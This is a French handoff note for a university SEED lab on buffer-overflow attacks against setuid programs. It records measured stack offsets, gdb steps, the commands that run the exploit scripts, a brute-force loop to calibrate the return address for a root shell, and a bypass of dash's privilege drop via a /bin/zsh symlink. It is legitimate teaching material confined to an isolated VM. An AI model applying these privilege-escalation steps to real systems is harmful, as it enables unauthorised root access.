# REPRISE — Lab 2 (CSI 4539 / CEG 4799) — Tâches E1 à E3

Ce document permet à un coéquipier de reprendre le travail exactement là où il
s'est arrêté. Toutes les manipulations se font dans l'environnement SEED isolé
(VM SEED Ubuntu 20.04, ASLR désactivé), conformément à l'usage autorisé.

## État d'avancement

| Tâche | Statut | Preuve attendue |
|-------|--------|-----------------|
| E1 — Disposition de la pile | ✅ Fait | distance = 112 octets (0x70) |
| E2 — Shellcode 32/64 bits | ✅ Fait | mysh64, a32.out, a64.out ; aucun octet nul |
| E3 Niveau 1 — stack-L1 | ✅ Fait | shell root (euid=0) |
| E3 Niveau 2 — stack-L2 | ✅ Fait | shell root, une seule charge pour 100–200 |
| E3 Niveau 3 — stack-L3 (64 bits) | ✅ Fait | shell root (euid=0), ret = buffer + 1456 |
| E3 Niveau 4 — stack-L4 | ⏳ Bonus, non commencé | — |

## Valeurs relevées (ASLR=0)

Les adresses dépendent de l'environnement et peuvent changer d'une session à
l'autre. À re-mesurer si une exploitation échoue (voir ci-dessous).

- stack-L1-dbg : `$ebp = 0xffffcab8`, `&buffer = 0xffffca4c` → offset = 112 (0x70)
- stack-L2-dbg : `&buffer = 0xffffca10` (offset réel observé = 172 = 0xac)
- stack-L3-dbg : `$rbp = 0x7fffffffd8f0`, `&buffer = 0x7fffffffd820` → décalage calibré ret = buffer + 1456 (0x5B0)

## Fichiers ajoutés (dans Buffer_Overflow_Setuid_Labsetup/Labsetup/code/)

- `reproduce_setuid.sh` — ASLR off + lien zsh + compilation
- `exploit_L1.py` — exploit Niveau 1 (fonctionnel)
- `exploit_L2.py` — exploit Niveau 2 (fonctionnel)
- `exploit_L3.py` — exploit Niveau 3 (décalage à calibrer)
- `scanner.py` — recherche du bon décalage pour le Niveau 3

Et dans Shellcode_Labsetup/Labsetup/ : `reproduce_shellcode.sh` (E2).

---

## Comment reproduire, étape par étape

### 0. Préparer l'environnement

```
cd Buffer_Overflow_Setuid_Labsetup/Labsetup/code
chmod +x reproduce_setuid.sh exploit_L1.py exploit_L2.py exploit_L3.py scanner.py
./reproduce_setuid.sh
```

### E1 — Disposition de la pile

```
touch badfile
gdb -q stack-L1-dbg
```

Dans gdb :

```
b bof
run
next
p $ebp
p &buffer
quit
```

Distance = ($ebp − &buffer) + 4.

### E2 — Shellcode

```
cd ../../../Shellcode_Labsetup/Labsetup
chmod +x reproduce_shellcode.sh
./reproduce_shellcode.sh
./mysh64
```

Dans le shell : `id` puis `exit`. Puis vérification 32/64 bits :

```
cd ../../Buffer_Overflow_Setuid_Labsetup/Labsetup/shellcode
make
./a32.out
./a64.out
```

### E3 Niveau 1

```
cd ../code
./exploit_L1.py
./stack-L1
```

Dans le shell : `id` → doit montrer `euid=0(root)`.

### E3 Niveau 2

```
./exploit_L2.py
./stack-L2
```

Dans le shell : `id` → `euid=0(root)`.

### E3 Niveau 3 (fait — décalage calibré : ret = buffer + 1456)

Rejeu direct (si l'environnement n'a pas changé) :

```
./exploit_L3.py
./stack-L3
```

Dans le shell : `id` → `euid=0(root)`.

Si l'attaque échoue (nouvel environnement), recalibrer comme suit.

Le tampon à l'exécution directe n'est pas à la même adresse que sous gdb
(gdb ajoute des variables d'environnement et un argv[0] plus long). Il faut
calibrer le décalage de l'adresse de retour avec `scanner.py`.

1. Re-mesurer les adresses dans le terminal courant :

```
touch badfile
gdb -q stack-L3-dbg
```

```
b bof
run
next
p $rbp
p &buffer
quit
```

2. Mettre à jour `rbp` et `buffer` dans `scanner.py` ET `exploit_L3.py`.

3. Lancer le scan bidirectionnel :

```
for x in $(seq -512 8 2048); do ./scanner.py $x; if echo id | ./stack-L3 2>/dev/null | grep -q 'uid='; then echo "TROUVE : x = $x"; break; fi; done
```

4. Reporter la valeur trouvée dans `exploit_L3.py` (ligne `ret = buffer + 0x...`,
   mettre `ret = buffer + <x>`), puis vérifier :

```
./exploit_L3.py
./stack-L3
```

Dans le shell : `id` → `euid=0(root)`.

## Notes importantes

- Si une exploitation échoue après un redémarrage ou dans un nouveau terminal,
  re-mesurer les adresses : l'environnement change la position de la pile.
- La protection de dash est contournée via le lien `/bin/sh -> /bin/zsh`
  (fait par `reproduce_setuid.sh`). L'autre méthode (ajouter `setuid(0)` au
  shellcode) sera traitée en E4.
- Prendre les captures d'écran (id montrant euid=0, état ASLR) pour les traces
  T1 à T3 au fur et à mesure.
